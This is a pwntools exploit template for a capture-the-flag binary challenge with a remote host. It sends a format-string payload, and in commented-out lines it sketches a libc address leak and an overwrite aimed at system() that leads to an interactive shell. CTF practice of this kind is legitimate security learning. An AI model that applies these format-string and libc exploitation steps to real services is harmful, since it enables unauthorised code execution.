#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc_path = './libc.so.6'
libc = ELF(libc_path, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'be.ax', 32323 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    
    io.sendline(b'1')
    io.sendline(b'%*c')
    io.clean()
    # io.sendline(b'1')
    # io.sendline(b'%s')
    # leak = unpack(io.recvuntil(b'\x7f', drop=False)[-6:].ljust(8, b'\x00'))
    # libc.address = leak - 0x1ec980
    # info(f'leak: {hex(leak)}')
    # info(f'libc: {hex(libc.address)}')
    # info(f'system: {hex(libc.sym.system)}')
    # io.clean()
    # io.sendline(b'2')
    # sleep(1)
    # io.sendline(f'{hex(libc.sym.system)}'.encode())
    io.interactive()

if __name__ == '__main__':
    exploit()